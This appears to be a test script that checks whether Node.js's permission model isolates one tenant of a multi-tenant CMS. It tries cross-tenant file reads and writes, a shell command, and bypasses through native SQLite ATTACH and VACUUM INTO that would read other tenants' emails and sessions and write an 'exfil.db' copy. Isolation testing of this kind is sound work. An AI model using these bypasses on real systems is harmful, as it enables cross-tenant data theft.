// M4 child — run under: node --permission --allow-fs-read=<acme dir> --allow-fs-read=<node_modules>
import { createRequire } from 'node:module';
import fs from 'node:fs';
import cp from 'node:child_process';
const req = createRequire(process.env.SK_R2_REQUIRE || 'package.json');
const Database = req('better-sqlite3');
const B = (process.env.SK_R2_BASE || '/tmp/sk-r2sec') + '/perm';
const attempt = (label, fn) => {
  try { const v = fn(); console.log(`  ${label}: ALLOWED${v === undefined ? '' : ' -> ' + String(v).slice(0, 70)}`); }
  catch (e) { console.log(`  ${label}: DENIED  [${e.code ?? ''}] ${String(e.message).split('\n')[0].slice(0, 90)}`); }
};
console.log('permission model active:', typeof process.permission === 'object');
attempt('fs.readFileSync(control.db)', () => fs.readFileSync(`${B}/control.db`, 'utf8').length + ' B');
attempt('fs.readFileSync(tenant/beta/site.db)', () => fs.readFileSync(`${B}/tenant/beta/site.db`).length + ' B');
attempt('fs.readFileSync(tenant/acme/site.db)', () => fs.readFileSync(`${B}/tenant/acme/site.db`).length + ' B');
attempt('fs.writeFileSync(into beta dir)', () => fs.writeFileSync(`${B}/tenant/beta/pwn.txt`, 'x'));
attempt('child_process.execSync(id)', () => cp.execSync('id').toString().trim());

let db = null;
attempt('load better-sqlite3 and open acme site.db', () => { db = new Database(`${B}/tenant/acme/site.db`, { readonly: true }); return 'handle open'; });
attempt('open beta site.db via sqlite (native)', () => { const d = new Database(`${B}/tenant/beta/site.db`, { readonly: true }); const n = d.prepare('SELECT count(*) n FROM cms_download_code').get().n; d.close(); return n + ' rows'; });
attempt('ATTACH beta via sqlite', () => { if (!db) throw new Error('no handle'); db.exec(`ATTACH DATABASE '${B}/tenant/beta/site.db' AS v`); return JSON.stringify(db.prepare('SELECT issued_to_email FROM v.cms_download_code').all()); });
attempt('ATTACH control.db via sqlite', () => { if (!db) throw new Error('no handle'); db.exec(`ATTACH DATABASE '${B}/control.db' AS c`); return JSON.stringify(db.prepare('SELECT count(*) n FROM c.sessions').get()); });
attempt('VACUUM INTO beta dir', () => { if (!db) throw new Error('no handle'); db.exec(`VACUUM INTO '${B}/tenant/beta/exfil.db'`); return 'wrote file'; });
if (db) db.close();
